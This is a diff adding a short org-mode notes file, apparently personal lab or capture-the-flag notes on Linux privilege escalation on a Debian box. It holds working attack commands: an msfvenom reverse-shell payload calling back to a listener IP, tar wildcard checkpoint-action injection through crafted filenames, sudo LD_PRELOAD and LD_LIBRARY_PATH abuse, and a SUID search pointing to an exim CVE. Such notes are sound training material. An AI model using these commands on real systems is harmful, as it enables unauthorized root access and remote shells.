@@ -1,0 +1,41 @@
+#+TITLE: Haxornotes
+
+* Linux PrivEsc (box)
+** Msfvenom
+- craft reverse_tcp payload to listen on port 4444
+- -o output switch
+- -p payload switch
+- -f format switch
+  : msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.6.27.168 LPORT=4444 -f elf -o shell.elf
+
+** Tar PrivEsc
+- if tar is executing with a wildcard (*) you can use the touch --checkpoint-action=exec=COMMAND &or payload
+  to privesc with it
+  #+begin_src bash
+
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+
+  #+end_src
+- if youre doing a privesc make sure that the path is included in the crontab or wherever
+- When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+
+** Sudo Env Variables
+#+begin_src bash
+
+user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+#+end_src
+- LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
+  : gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+  : sudo LD_PRELOAD=/tmp/preload.so program-name-here
+  : gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+  : sudo LD_LIBRARY_PATH=/tmp apache2
+
+** SUID / SGID Executables - Known Exploits
+- Find all the SUID/SGID executables on the Debian VM
+  : find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+- exim-4.84-3
+- cve-2016-1531
